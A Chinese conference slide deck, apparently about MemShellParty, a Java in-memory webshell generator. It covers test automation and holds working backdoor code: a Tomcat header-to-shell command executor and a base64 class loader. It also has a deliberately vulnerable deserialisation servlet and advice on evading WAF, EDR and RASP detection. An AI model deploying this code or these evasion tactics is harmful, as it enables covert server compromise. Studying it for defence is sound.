---
theme: seriph
glowSeed: 4
transition: fade-out
mdc: true
background: /cover.png
title: Java 内存马武器化与开源
---

# Java 内存马武器化与开源

MemShellParty 一款首个搭载全中间件自动化测试的 Java 内存马生成平台

<!--
Hello，大家好，很高兴能在这里分享我这半年来一直在做的开源项目，MemShellParty，它应该是首个搭载全中间件自动化测试的 Java 内存马生成平台，目前已经相对成熟，所以今天，我想和大家聊聊 Java 内存马的武器化与开源之路。
-->

---
layout: "intro"
class: pl-35
glowSeed: 14
---

# ReaJason

<div class="[&>*]:important-leading-10 opacity-80">

- Java RASP 核心研发 (靖云甲)
- MemShellParty 作者
- Java Chains 成员
- <div flex items-center gap-1>就职于边界无限 <a href="https://www.boundaryx.com"><img src="/boundaryx.svg" w-25 alt="boundaryx.svg" /></a></div>

</div>

<div my-10 w-min flex="~ gap-1" items-center justify-center>
  <div i-ri-user-3-line op50 ma text-xl />
  <div><a href="https://reajason.eu.org" target="_blank" class="border-none! font-300">reajason.eu.org</a></div>
  <div i-ri-github-line op50 ma text-xl ml4/>
  <div><a href="https://github.com/reajason" target="_blank" class="border-none! font-300">reajason</a></div>
  <div i-ri-twitter-line op50 ma text-xl ml4/>
  <div><a href="https://x.com/ReaJason_" target="_blank" class="border-none! font-300">ReaJason</a></div>
  <div i-ri-bilibili-line op50 ma text-xl ml4/>
  <div><a href="https://space.bilibili.com/233683051" target="_blank" class="border-none! font-300" ws-nowrap>ReaJason</a></div>
</div>

<img src="/avatar.jpg" alt="avatar.jpg" rounded-full absolute top-36 right-35 w-40 />

<div flex="~ gap2">

</div>

<!--
我是 ReaJason，目前就职于边界无限，是靖云甲产品线的 Java RASP 核心研发工程师。这是我的第一次踏入网络安全的行业，之前是个做 OA 的 Java CRUD boy。今天的分享内容就来源于我的个人开源项目，MemShellParty，借此我也加入了 Java Chains 组织，成为了其中的一员，之后也会在 Java Chains 上分享自己学习到的一些利用链。希望今天的分享能给大家带来一些新的思路。
-->

---

# 为什么编写 MemShellParty

<div mt-4 />

<v-clicks>

- 某天，客户需要我做一个 <span text-red> WAS 内存马注入靶场 </span> （测试 RASP 防护效果）
- 我在 GitHub 上找到了 <span text-orange><a target="_blank" href="https://github.com/pen4uin/java-memshell-generator">java-memshell-generator</a></span>，很快便生成了 WAS Filter 哥斯拉马
- 注入之后 WAS 靶场直接打挂了，经过<span text-green>一个多小时的调试</span>终于可以用了
- 接着测试冰蝎马时，也是一直连不上，又调了很久
- 我不禁开始思考，为什么一个这么多人用的项目，<span text-violet>可用性这么差？</span>
- 在查看源码之后，由于本人不太喜欢 <span text-yellow>JavaFX</span> 和 <span text-blue>Javassist</span>，并且一直在找新的开源项目 idea
- 于是想写一个内存马生成 Web 版，叫作 <span v-after v-mark.teal="2" text-teal>MemShellParty</span>

</v-clicks>

<v-click>

<br>

#### 推荐阅读
<br>

- [关于 Yak Shaving](https://antfu.me/posts/about-yak-shaving-zh)<span op50 text-sm> - Anthony Fu</span>
- [开源的心理建设](https://antfu.me/posts/mental-health-oss-zh)<span op50 text-sm> - Anthony Fu</span>
- [Open Source Guides](https://opensource.guide/)<span op50 text-sm> - GitHub.com</span>

</v-click>

<!--
首先想和大家聊一下为什么我会编写 MemShellParty 这个项目，契机是什么

<click> 当时我正在开发新的需求，突然让我写个靶场，还急用，内存马测试场景一般包括 Servlet、Filter、Listener、Spring 框架以及 Agent 内存马 

<click> 

<click> 最终发现是 JMG WAS Filter 注入逻辑有问题，注入是用的是全类名，但是判断是否已注入用的是类名简称，会触发重复注入，且第二次注入 WAS 内部判断是已经注册过了，返回的 FilterConfig 是 null，这就会导致所有请求都会因为 NPE 直接挂掉，在查看其他注入实现，也有类似的问题，如果使用 JMG 二开的师傅可以留意一下。

<click> 最后发现，冰蝎马中如果 response 包装类的 OutputStream 方式不是 public 的就会连接失败（response.getClass().getMethod("OutputStream")），因此需要手动 unwrap 一下

<click> 而且还听说这个项目是奇安信开源的，奇安信也算网安里面的大厂了，搞这么垃圾


<click> 哥斯拉和冰蝎的连接器都使用 JavaFX，启动起来有时候会遇到 trouble，Javassist 往字节码直接塞字符串的方式看起来不干净（当然并不是说 Javassist 不好，只要能实现最终功能的工具就是好工具）

<click> 因为开源项目大多可用性较差，于是想做个带全自动化测试靶场的武器化平台
-->

---
name: MemShellParty
layout: center
transition: none
---

<div class="grid grid-cols-[3fr_2fr] gap-2">
  <div class="text-center w-125 pb-4">
    <h1>MemShellParty</h1>
    <div class="opacity-50 mb-2 text-sm">
      一款专注于 Java 主流 Web 中间件的内存马快速生成工具
    </div>
    <div class="text-center">
      <a class="!border-none" href="https://central.sonatype.com/artifact/io.github.reajason/generator" target="__blank"><img class="h-4 inline mx-0.5" src="https://img.shields.io/maven-central/v/io.github.reajason/generator?label=MavenCentral&style=flat-square" alt="MavenCentral version"></a>
      <a class="!border-none" href="https://hub.docker.com/r/reajason/memshell-party" target="__blank"><img class="h-4 inline mx-0.5" alt="Docker Pulls" src="https://img.shields.io/docker/pulls/reajason/memshell-party?label=DockerHub%20Pulls&style=flat-square"></a>
      <img class="h-4 inline mx-0.5" alt="First Commit" src="https://img.shields.io/badge/First_Commit-2024/9/1-blue?style=flat-square" />
      <img class="h-4 inline mx-0.5" alt="Test_Cases" src="https://img.shields.io/badge/Test_Cases-3600-blue?style=flat-square" />
      <br>
      <a class="!border-none" href="https://github.com/reajason/memshellparty" target="__blank"><img class="mt-2 h-4 inline mx-0.5" alt="GitHub stars" src="https://img.shields.io/github/stars/reajason/memshellparty?style=social"></a>
    </div>
  </div>
  <div class="border-l pl-4 w-75 h-40 border-gray-400 border-opacity-25 !all:leading-12 !all:list-none my-auto">
  <img src="/commits.png" />
  </div>
</div>

<!--
简单介绍一下 MemShellParty 目前的一些情况：

1. 当前已发布了 2.0.0 版本，支持了探测马的生成，目的就是为了在不知道选何种服务类型的马生成时可以进行 RCE 探测一下。
2. 当前 DockerHub 已有 3k 的 pull 量，不算多，但是也算是有用户吧
3. 首次提交代码的时间是 2024 年 9 月 1 号，这么算，这个项目快有一年了。
4. 目前测试 case 数量已经有 3000 了，所以可用性这块一直还是保持着在的，不过可能还是会有测试不到的地方，如果遇到不可用的情况，还需要有用户能反馈，不然我也不知道。
5. 目前这个项目就我一个人开发，已经做了 632 个 commits，代码量也是比较丰富，从新增和删除的代码来看，其实我这期间已经做了两三次重构了。
-->

---
name: MemShellParty
layout: center
---

<div class="grid grid-cols-[3fr_2fr] gap-2">
  <div class="text-center w-125 pb-4">
    <h1>MemShellParty</h1>
    <div class="opacity-50 mb-2 text-sm">
      一款专注于 Java 主流 Web 中间件的内存马快速生成工具
    </div>
    <div class="text-center">
      <a class="!border-none" href="https://central.sonatype.com/artifact/io.github.reajason/generator" target="__blank"><img class="h-4 inline mx-0.5" src="https://img.shields.io/maven-central/v/io.github.reajason/generator?label=MavenCentral&style=flat-square" alt="MavenCentral version"></a>
      <a class="!border-none" href="https://hub.docker.com/r/reajason/memshell-party" target="__blank"><img class="h-4 inline mx-0.5" alt="Docker Pulls" src="https://img.shields.io/docker/pulls/reajason/memshell-party?label=DockerHub%20Pulls&style=flat-square"></a>
      <img class="h-4 inline mx-0.5" alt="First Commit" src="https://img.shields.io/badge/First_Commit-2024/9/1-blue?style=flat-square" />
      <img class="h-4 inline mx-0.5" alt="Test_Cases" src="https://img.shields.io/badge/Test_Cases-3600-blue?style=flat-square" />
      <br>
      <a class="!border-none" href="https://github.com/reajason/memshellparty" target="__blank"><img class="mt-2 h-4 inline mx-0.5" alt="GitHub stars" src="https://img.shields.io/github/stars/reajason/memshellparty?style=social"></a>
    </div>
  </div>
  <div class="border-l pl-4 w-75 h-40 border-gray-400 border-opacity-25 !all:leading-12 !all:list-none my-auto">
  <ul class="flex flex-col gap-4">
  <li class="line-height-normal!">自动化测试</li>
  <li class="line-height-normal!">可维护性代码</li>
  <li class="line-height-normal!">内存马编写与优化</li>
 <li class="line-height-normal!">内存马防御与免杀</li>
  </ul>
  </div>
</div>

<!--
今天我想分享的课题主要有以下几个方面：
1. 自动化测试
2. 可维护性代码
3. 内存马编写与优化
4. 内存马防御与免杀
-->

---
layout: center
class: text-center
---

# 自动化测试

快速检测代码变更引入的缺陷，缩短反馈周期

---

<div class="grid grid-cols-2 gap-x-4"><div>

# 为什么没有自动化测试

1. 一般漏洞可用版本强限制，基本都在一个大版本中，比较容易测试
2. 比起研究自动化测试，眼下研究编写攻击 payload 的价值更大（精心构造的 payload）
3. 红队安全研究人员普遍没有项目开发经验，对软件工程并不在意（可用即可）
4. 作为初学者的第一个开源项目，实现完整的功能已经很不错了

</div><div>

# 什么项目需要自动化测试

1. 测试步骤繁琐，自动化能缩减验证步骤
2. 当后续需要优化 payload 时疲于测试可能会放弃修改，自动化能拉长项目生命周期
3. 一个测试通过的 CI 能给使用者比较大的信心，当前项目是可用的

</div></div>

---

# 自动化测试需要了解的技术

- Maven/Gradle - 构建工具
- Junit5 - 测试框架
- 简便的断言工具，例如 Hamcrest 或 AssertJ
- Docker - 运行测试漏洞环境
- 集成测试工具，例如 Testcontainers

---
level: 2
---

# 用例 1: Tomcat 容器测试中间件类型探测 payload

<v-click>

````md magic-move
```java
@Testcontainers
public class TomcatContainerTest {

}
```
```java
@Testcontainers
public class TomcatContainerTest {
    @Container
    public final static GenericContainer<?> container = new GenericContainer<>("tomcat:8-jre8")
            .withCopyToContainer(warFile, "/usr/local/tomcat/webapps/app.war")
            .waitingFor(Wait.forHttp("/app"))
            .withExposedPorts(8080);
}
```
```java
@Testcontainers
public class TomcatContainerTest {
    @Container
    public final static GenericContainer<?> container = new GenericContainer<>("tomcat:8-jre8")
            .withCopyToContainer(warFile, "/usr/local/tomcat/webapps/app.war")
            .waitingFor(Wait.forHttp("/app"))
            .withExposedPorts(8080);

    @Test
    void testServerDetection() {
        int port = container.getMappedPort(8080);
        String url = "http://127.0.0.1:" + port + "/app";
        String data = VulTool.post(url + "/b64", DetectionTool.getServerDetection());
        assertEquals(Server.Tomcat, data);
    }
}
```
```java
@Testcontainers
public class TomcatContainerTest {
    @Container
    public final static GenericContainer<?> container = new GenericContainer<>("tomcat:8-jre8")
            .withCopyToContainer(warFile, "/usr/local/tomcat/webapps/app.war")
            .waitingFor(Wait.forHttp("/app"))
            .withExposedPorts(8080);
    
    @AfterAll
    public static void tearDown() {
        System.out.println(container.getLogs());
    }

    @Test
    void testServerDetection() {
        int port = container.getMappedPort(8080);
        String url = "http://127.0.0.1:" + port + "/app";
        String data = VulTool.post(url + "/b64", DetectionTool.getServerDetection());
        assertEquals(Server.Tomcat, data);
    }
}
```
````

<Arrow color="red" v-click x1="750" y1="250" x2="700" y2="180" />

</v-click>

<v-click>

官方文档：[Testcontainers for Java](https://java.testcontainers.org/quickstart/junit_5_quickstart/)

</v-click>


---

# 用例 2: 不同版本 CB 依赖的反序列化漏洞测试
单个 war 包，不同版本的依赖打进去，只会作用一个。

<v-click>

````md magic-move
```java
ByteArrayInputStream inputStream = new ByteArrayInputStream(Base64.getDecoder().decode(data));
ObjectInputStream bis = new ObjectInputStream(inputStream);
bis.readObject();
```
```java
ByteArrayInputStream inputStream = new ByteArrayInputStream(Base64.getDecoder().decode(data));
ObjectInputStream bis = new ObjectInputStream(inputStream) {
    @Override
    protected Class<?> resolveClass(ObjectStreamClass desc) throws IOException, ClassNotFoundException {
        return Class.forName(desc.getName(), false, classLoader);
    }
};
bis.readObject();
```
```java
@Override
protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
    String libPath = getServletContext().getRealPath("/WEB-INF/dep");
    URL[] urls = getDependentPaths().stream().map(path -> {
        try {
            return new File(libPath + File.separator + path).toURI().toURL();
        } catch (MalformedURLException e) {
            throw new RuntimeException(e);
        }
    }).toArray(URL[]::new);
    final URLClassLoader classLoader = new URLClassLoader(urls);
    String data = req.getParameter("data");
    ByteArrayInputStream inputStream = new ByteArrayInputStream(Base64.getDecoder().decode(data));
    ObjectInputStream bis = new ObjectInputStream(inputStream) {
        @Override
        protected Class<?> resolveClass(ObjectStreamClass desc) throws IOException, ClassNotFoundException {
            return Class.forName(desc.getName(), false, classLoader);
        }
    };
    bis.readObject();
}
```
````

</v-click>

---

# CB 链不同版本反序列化靶场编写

```java
@WebServlet("/java_deserialize/cb161")
public class JavaReadObjCB161jServlet extends BaseDeserializeServlet {
    @Override
    List<String> getDependentPaths() {
        return Arrays.asList("commons-beanutils-1.6.1.jar", "commons-collections-2.0.jar", "commons-logging-1.0.jar");
    }
}
```
```java
@WebServlet("/java_deserialize/cb183")
public class JavaReadObjCB183jServlet extends BaseDeserializeServlet {
    @Override
    List<String> getDependentPaths() {
        return Arrays.asList("commons-beanutils-1.8.3.jar", "commons-logging-1.1.1.jar");
    }
}
```
```java
@WebServlet("/java_deserialize/cb194")
public class JavaReadObjCB194Servlet extends BaseDeserializeServlet {
    @Override
    List<String> getDependentPaths() {
        return Arrays.asList("commons-beanutils-1.9.4.jar", "commons-logging-1.2.jar");
    }
}
```

---

# Gradle 靶场打包配置

<div class="grid grid-cols-2 gap-1">

```kotlin
configurations {
    create("cb110")
    create("cb194")
    create("cb183")
    create("cb170")
    create("cb161")
}

dependencies {
    "cb110"("commons-beanutils:commons-beanutils:1.10.0")
    "cb194"("commons-beanutils:commons-beanutils:1.9.4")
    "cb183"("commons-beanutils:commons-beanutils:1.8.3")
    "cb170"("commons-beanutils:commons-beanutils:1.7.0")
    "cb161"("commons-beanutils:commons-beanutils:1.6.1")
}
```

```kotlin
tasks.war {
    duplicatesStrategy = DuplicatesStrategy.EXCLUDE

    doFirst {
        delete("src/main/webapp/WEB-INF/dep")
        copy {
            from(
                configurations["cb110"],
                configurations["cb194"],
                configurations["cb183"],
                configurations["cb170"],
                configurations["cb161"]
            )
            into("src/main/webapp/WEB-INF/dep")
        }
    }
}
```
</div>

<br>

靶场项目参考地址：[vul/vul-webapp-deserialize/build.gradle.kts](https://github.com/ReaJason/MemShellParty/blob/master/vul/vul-webapp-deserialize/build.gradle.kts)

---

# GitHub Actions 自动化测试配置

```yaml {*}{maxHeight:'400px'}
jobs:
    memshell-integration-test:
    strategy:
      fail-fast: false
      matrix:
        cases:
          - middleware: "tomcat"
            depend_tasks: ":vul:vul-webapp:war :vul:vul-webapp-expression:war :vul:vul-webapp-deserialize:war :vul:vul-webapp-jakarta:war"
          - middleware: "jetty"
            depend_tasks: ":vul:vul-webapp:war :vul:vul-webapp-jakarta:war"
          - middleware: "jbossas"
            depend_tasks: ":vul:vul-webapp:war"
          - middleware: "jbosseap"
            depend_tasks: ":vul:vul-webapp:war"
          - middleware: "wildfly"
            depend_tasks: ":vul:vul-webapp:war :vul:vul-webapp-jakarta:war"
          - middleware: "glassfish"
            depend_tasks: ":vul:vul-webapp:war :vul:vul-webapp-jakarta:war"
          - middleware: "resin"
            depend_tasks: ":vul:vul-webapp:war"
          - middleware: "payara"
            depend_tasks: ":vul:vul-webapp:war :vul:vul-webapp-jakarta:war"
          - middleware: "websphere"
            depend_tasks: ":vul:vul-webapp:war"
          - middleware: "websphere7"
            depend_tasks: ":vul:vul-webapp:war"
          - middleware: "weblogic"
            depend_tasks: ":vul:vul-webapp:war"
          - middleware: "springwebmvc"
            depend_tasks: ":vul:vul-springboot1:bootJar :vul:vul-springboot2:bootJar :vul:vul-springboot2-jetty:bootJar :vul:vul-springboot2-undertow:bootJar :vul:vul-springboot2:bootWar :vul:vul-springboot3:bootJar"
          - middleware: "springwebflux"
            depend_tasks: ":vul:vul-springboot2-webflux:bootJar :vul:vul-springboot3-webflux:bootJar"
          - middleware: "xxljob"
            depend_tasks: ""
    runs-on: ubuntu-latest
    name: ${{ matrix.cases.middleware }}
    needs: [ unit-test ]
    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Setup Java
        uses: actions/setup-java@v4
        with:
          distribution: 'temurin'
          java-version: 17

      - name: Setup Gradle
        uses: gradle/actions/setup-gradle@v4

      - name: Prepare for Integration Test
        run: ./gradlew ${{ matrix.cases.depend_tasks }}

      - name: Integration Test with gradle
        run: ./gradlew :integration-test:test --tests '*.memshell.${{ matrix.cases.middleware }}.*' --info

      - name: Export Integration Test Summary
        run: cat integration-test/build/test-results/report.md >> $GITHUB_STEP_SUMMARY
```

完整配置请参考：[MemShellParty/.github/workflows/test.yaml](https://github.com/ReaJason/MemShellParty/blob/master/.github/workflows/test.yaml)

---

# GitHub Actions 测试 CI

<div class="grid grid-cols-2 gap-1">

![alt text](/github-actions-test.png)

![alt text](/github-actions-memshell.png)

</div> 

---

# GitHub Actions 发版 CI

<div>

![alt text](/github-actions-release.png)

</div>

---
layout: center
class: text-center
---

# 可维护性代码
编写易于理解和修改的代码

---

# Java-Chains 中的 Tomcat 回显马实现

````md magic-move
```java
public TomcatEcho2Bytecode() {
    try {
        boolean var1 = false;
        Thread[] var2 = (Thread[]) getFV(Thread.currentThread().getThreadGroup(), "threads");

        for (int var3 = 0; var3 < var2.length; ++var3) {
            Thread var4 = var2[var3];
            if (var4 != null) {
                String var5 = var4.getName();
                if (!var5.contains("exec") && var5.contains("http")) {
                    Object var6 = getFV(var4, "target");
                    if (var6 instanceof Runnable) {
                        try {
                            var6 = getFV(getFV(getFV(var6, "this$0"), "handler"), "global");
                        } catch (Exception var141) {
                            continue;
                        }

                        List var8 = (List) getFV(var6, "processors");

                        for (int var9 = 0; var9 < var8.size(); ++var9) {
                            Object var10 = var8.get(var9);
                            var6 = getFV(var10, "req");
                            Object var11 = var6.getClass().getMethod("getResponse").invoke(var6);

                            try {
                                var5 = (String) var6.getClass().getMethod("getHeader", String.class)
                                    .invoke(var6, new String(header));
                                if (var5 != null && !var5.isEmpty()) {
                                    String c = new String(Base64.getDecoder().decode(var5));
                                    String[] var12 = System.getProperty("os.name").toLowerCase().contains("window") 
                                        ? new String[]{"cmd.exe", "/c", c} 
                                        : new String[]{"/bin/sh", "-c", c};
                                    writeBody(var11, 
                                      ((new Scanner((new ProcessBuilder(var12)).start().getInputStream()))
                                          .useDelimiter("\\A").next() + "=====").getBytes()
                                      );
                                    var1 = true;
                                }

                                if (var1) {
                                    break;
                                }
                            } catch (Exception var13) {
                                writeBody(var11, var13.getMessage().getBytes());
                            }
                        }

                        if (var1) {
                            break;
                        }
                    }
                }
            }
        }
    } catch (Exception ignored) {
    }
}
```
```java
public TomcatEcho2Bytecode() {
    try {
        boolean done = false;
        Thread[] threads = (Thread[]) getFV(Thread.currentThread().getThreadGroup(), "threads");

        for (int i = 0; i < threads.length; ++i) {
            Thread thread = threads[i];
            if (thread != null) {
                String threadName = thread.getName();
                if (!threadName.contains("exec") && threadName.contains("http")) {
                    Object target = getFV(thread, "target");
                    if (target instanceof Runnable) {
                        try {
                            target = getFV(getFV(getFV(target, "this$0"), "handler"), "global");
                        } catch (Exception e) {
                            continue;
                        }

                        List processors = (List) getFV(target, "processors");

                        for (int j = 0; j < processors.size(); ++j) {
                            Object processor = processors.get(j);
                            Object req = getFV(processor, "req");
                            Object response = req.getClass().getMethod("getResponse").invoke(req);

                            try {
                                String data = (String) req.getClass().getMethod("getHeader", String.class)
                                    .invoke(req, new String(header));
                                if (data != null && !data.isEmpty()) {
                                    String c = new String(Base64.getDecoder().decode(data));
                                    String[] cmd = System.getProperty("os.name").toLowerCase().contains("window") 
                                        ? new String[]{"cmd.exe", "/c", c} 
                                        : new String[]{"/bin/sh", "-c", c};
                                    writeBody(response, 
                                        ((new Scanner((new ProcessBuilder(cmd)).start().getInputStream()))
                                            .useDelimiter("\\A").next() + "=====").getBytes());
                                    done = true;
                                }

                                if (done) {
                                    break;
                                }
                            } catch (Exception var13) {
                                writeBody(response, var13.getMessage().getBytes());
                            }
                        }

                        if (done) {
                            break;
                        }
                    }
                }
            }
        }
    } catch (Exception ignored) {
    }
}
```
```java
public TomcatEcho2Bytecode() {
    try {
        boolean done = false;
        Thread[] threads = (Thread[]) getFV(Thread.currentThread().getThreadGroup(), "threads");
        for (Thread thread : threads) {
            if (thread == null) {
                continue;
            }
            String threadName = thread.getName();
            if (threadName.contains("exec") || !threadName.contains("http")) {
                continue;
            }
            Object target = getFV(thread, "target");
            if (!(target instanceof Runnable)) {
                continue;
            }
            try {
                target = getFV(getFV(getFV(target, "this$0"), "handler"), "global");
            } catch (Exception e) {
                continue;
            }
            List processors = (List) getFV(target, "processors");
            for (Object processor : processors) {
                Object req = getFV(processor, "req");
                Object response = req.getClass().getMethod("getResponse").invoke(req);
                try {
                    String data = (String) req.getClass().getMethod("getHeader", String.class)
                        .invoke(req, new String(header));
                    if (data != null && !data.isEmpty()) {
                        String c = new String(Base64.getDecoder().decode(data));
                        String[] cmd = System.getProperty("os.name").toLowerCase().contains("window") 
                            ? new String[]{"cmd.exe", "/c", c} 
                            : new String[]{"/bin/sh", "-c", c};
                        writeBody(response, 
                            ((new Scanner((new ProcessBuilder(cmd)).start().getInputStream()))
                                .useDelimiter("\\A").next() + "=====").getBytes());
                        return;
                    }
                } catch (Exception var13) {
                    writeBody(response, var13.getMessage().getBytes());
                }
            }
        }
    } catch (Exception ignored) {
    }
}
```
```java
public TomcatEcho2Bytecode() {
    try {
        Thread[] threads = (Thread[]) getFV(Thread.currentThread().getThreadGroup(), "threads");
        for (Thread thread : threads) {
            if (thread == null) {
                continue;
            }
            String threadName = thread.getName();
            if (threadName.contains("exec") || !threadName.contains("http")) {
                continue;
            }
            Object target = getFV(thread, "target");
            if (!(target instanceof Runnable)) {
                continue;
            }
            try {
                target = getFV(getFV(getFV(target, "this$0"), "handler"), "global");
            } catch (Exception e) {
                continue;
            }

            List processors = (List) getFV(target, "processors");

            for (Object processor : processors) {
                Object req = getFV(processor, "req");
                Object response = req.getClass().getMethod("getResponse").invoke(req);
                String data = (String) req.getClass().getMethod("getHeader", String.class)
                    .invoke(req, new String(header));
                if (data != null && !data.isEmpty()) {
                    try {
                        String c = new String(Base64.getDecoder().decode(data));
                        String[] cmd = System.getProperty("os.name").toLowerCase().contains("window") 
                            ? new String[]{"cmd.exe", "/c", c} 
                            : new String[]{"/bin/sh", "-c", c};
                        writeBody(response, 
                            ((new Scanner((new ProcessBuilder(cmd)).start().getInputStream()))
                                .useDelimiter("\\A").next() + "=====").getBytes());
                    } catch (Exception var13) {
                        writeBody(response, var13.getMessage().getBytes());
                    }
                    return;
                }
            }
        }
    } catch (Exception ignored) {
    }
}
```
````

<v-click>

适配 Tomcat6 ~ Tomcat11 参考实现：[MemShellParty/generator/TomcatWriter.java](https://github.com/ReaJason/MemShellParty/blob/master/generator/src/main/java/com/reajason/javaweb/probe/payload/response/TomcatWriter.java)

</v-click>

<style>
  .slidev-code-wrapper.slidev-code-magic-move {
    max-height: 400px;
    overflow-y: scroll;
    --start: 1;
  }
</style>

---

# 提高编程技能

- 了解和认识软件工程 —— [《代码大全》 - 安娜的档案](https://zh.annas-archive.org/search?q=%E4%BB%A3%E7%A0%81%E5%A4%A7%E5%85%A8)
- 类命名、函数命名、参数命名、字段命名、包名、模块名
- 代码重构不断演进 —— [《重构：改变既有代码的设计》 - 安娜的档案](https://zh.annas-archive.org/search?q=%E9%87%8D%E6%9E%84%3A%E6%94%B9%E5%96%84%E6%97%A2%E6%9C%89%E4%BB%A3%E7%A0%81%E7%9A%84%E8%AE%BE%E8%AE%A1%28%E7%AC%AC2%E7%89%88%29)
- 上网冲浪，了解别人是如何做的
- 工欲善其事必先利其器，了解各种工具小技巧


---
layout: center
class: text-center
---

# 内存马编写与优化
适配了这么多中间件总归会遇到些问题

---

# 当前类生成体系

- 注入器和内存马分离：Tomcat Filter 的注入方式是固定的，但是在 Filter 上挂的马是不固定的

```java

public static MemShellResult generate(ShellConfig shellConfig, // 内存马生成通用配置，shrink、bypassJavaModule
                                      InjectorConfig injectorConfig, // 注入器配置，urlPattern
                                      ShellToolConfig shellToolConfig) // 内存马功能配置，哥斯拉 pass、key
{
    // do it
}
```

- 类生成与打包方式分离：内存马生成 BASE64 可用于其他工具进行集成

```java
public interface Packer {
    default String pack(ClassPackerConfig classPackerConfig) {
        throw new UnsupportedOperationException("当前 " + this.getClass().getSimpleName() + " 不支持 string 生成");
    }
}

public class ClassPackerConfig {
    private String className;
    private byte[] classBytes;
    private String classBytesBase64Str;
    private boolean byPassJavaModule;
}
```

---

# 修改了类名但还是能看到原始类名

SourceFileAttribute

<img src="/memshell_base64.png" class="h-md">

---

# 字节码缩小

```java
ClassReader cr = new ClassReader(bytes);
ClassWriter cw = new ClassWriter(ClassWriter.COMPUTE_MAXS);
ClassVisitor cv = new ClassVisitor(Opcodes.ASM9, cw) {
    @Override
    public void visitSource(String source, String debug) {

    }
};
cr.accept(cv, ClassReader.SKIP_DEBUG);
return cw.toByteArray();
```
```java
/**
 * A flag to skip the SourceFile, SourceDebugExtension, LocalVariableTable,
 * LocalVariableTypeTable, LineNumberTable and MethodParameters attributes. If this flag is set
 * these attributes are neither parsed nor visited (i.e. {@link ClassVisitor#visitSource}, {@link
 * MethodVisitor#visitLocalVariable}, {@link MethodVisitor#visitLineNumber} and {@link
 * MethodVisitor#visitParameter} are not called).
 */
public static final int SKIP_DEBUG = 2;
```

---

# 编写通用 Agent

Java Agent 支持添加 ClassFileTransformer 修改类字节码。

### 1. JMG Agent 实现方式

通过 Java Agent 注入正常的 Filter、Listener 马 - Fake Agent

```java {*}{maxHeight:'300px'}
if (request instanceof HttpServletRequest && response instanceof HttpServletResponse) {
      HttpServletRequest httpServletRequest = (HttpServletRequest)request;
      HttpServletResponse httpServletResponse = (HttpServletResponse)response;
      try {
          byte[] byArray;
          if (httpServletRequest.getHeader("User-Agent") == null 
              || !httpServletRequest.getHeader("User-Agent").contains("magic")) break block12;
          String string = "x";
          try {
              Class<?> clazz = Class.forName("sun.misc.BASE64Decoder");
              byArray = (byte[])clazz.getMethod("decodeBuffer", String.class).invoke(clazz.newInstance(), string);
          }
          catch (Throwable throwable) {
              Class<?> clazz = Class.forName("java.util.Base64");
              Object object = clazz.getMethod("getDecoder", null).invoke(clazz, null);
              byArray = (byte[])object.getClass().getMethod("decode", String.class).invoke(object, string);
          }
          URLClassLoader uRLClassLoader = new URLClassLoader(new URL[0], Thread.currentThread().getContextClassLoader());
          Method method = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, Integer.TYPE, Integer.TYPE);
          method.setAccessible(true);
          Class clazz = (Class)method.invoke(uRLClassLoader, byArray, new Integer(0), new Integer(byArray.length));
          clazz.newInstance();
      }
      catch (Exception exception) {
          exception.printStackTrace();
      }
  }
}
```

---

### 2. 哥斯拉实现

Agent Jar 默认由 getSystemClassLoader 进行加载，因此可直接通过其进行加载，但是 GlassFish/WAS 这种 OSGI 类加载模型会有限制，加载不到

```java
try {
    if (Class.forName("xxx.ErrorAgentFilterChain", true, ClassLoader.getSystemClassLoader()).newInstance()
            .equals(new Object[]{request, response})) {
        return;
    }
}
catch (Throwable throwable) {}
```

### 3. 最终选择的实现

使用 ASM 将内存马类 define 到增强类的 ClassLoader 中，直接对其进行调用（ByteBuddy 可以方便进行内存马逻辑代码全注入，但是包太大，方案舍弃）

```java
try {
    if (new ErrorAgentFilterChain().equals(new Object[]{request, response})) {
        return;
    }
}
catch (Throwable throwable) {}
```

---
layout: center
class: text-center
---

# 内存马防御

WAF/WAAP、HIDS/EDR、RASP 各显神通

---
layout: intro
---

# WAF/WAAP - Web 应用防火墙

部署在网站服务器前方，实时检查所有访问网站的流量，识别并拦截针对网站应用层发起的各种网络攻击

<v-clicks>

- 异常请求头，例如 X-Echo、x-client-data
- 异常路径请求或请求方法，例如往 xx.js 发送 POST 请求
- 异常的请求或响应数据，例如，多次请求响应体长度变化大，BASE64 编码
- 特殊的 User-Agent 和 Referer 字段

</v-clicks>

---
layout: intro
---

# HIDS/EDR - 主机入侵检测系统

部署在主机上的安全软件，通过监控系统文件、进程和日志等内部活动，来检测和告警潜在的入侵行为

- 主动式周期扫描
- 通过 Java Agent 对 Java 应用类字节码 DUMP，对其进行字节码分析

---
layout: intro
---

# RASP - 运行时应用自我保护

注入到应用中，针对各种敏感函数进行监控，能精确识别并抵御自身受到的攻击

- 被动式扫描
- 通过注册自定义 ClassFileTransformer 即可监听每一个注册到 JVM 中的类，对其进行字节码分析
- 各种敏感行为的切点检测，例如文件操作、命令执行、数据库连接、代理隧道建立等等

---
layout: intro
---

# 内存马字节码特征

<v-clicks>

- 继承 ClassLoader 并在内部调用 defineClass 方法
- 反射调用敏感方法，例如 ClassLoader.defineClass、addFilter、addListener 等
- 加密、编码函数调用，AES + BASE64 + XOR
- 命令回显函数调用，Runtime.exec，ProcessBuilder.start 等
- 可疑的类名，xxxUtil、godzilla、behinder
- 类加载调用 defineClass(byte[],int,int) 签名，不传 className

</v-clicks>

---
layout: center
class: text-center
---

# 内存马免杀

绕过各种检测系统，实现隐蔽

---

# 流量层免杀

尽可能模拟正常流量，即便被注意到，安全运营人员也难以立即做出判断

- 加密流量，使用国密 SM4、Base32
- 请求头可使用授权请求头，例如 `Authorization: Bearer JWT` 传交互参数
- 先挂一个 Filter 马，采集几分钟流量生成流量模板

<div class="grid grid-cols-2 gap-1">

```http
POST /api/v1/resources HTTP/1.1
Content-Type: application/json
Authorization: Bearer JWT
Host: example.com
Content-Length: 112

{
  "access_token": "JWT",
  "encrypt_data": "SM4 + Base32",
  "size": 20,
  "page": 1,
  "order": "date desc"
}
```

```http
{
  "total": "732",
  "page": "1",
  "size": "10",
  "data": [
    {
      "name": "xxx",
      "blob": "SM4 + Base32",
      "image": "data:image/jpeg;base64, SM4 + Base32"
      "date": "2025-03-04 12:32:11"
    },
  ]
}
```

</div>

---

# 字节码特征消除

- 主动扫描工具为了减少对应用的影响，一般设置有白名单，使类特征命中白名单即可绕过
- 选取非常见 Web 组件挂载内存马
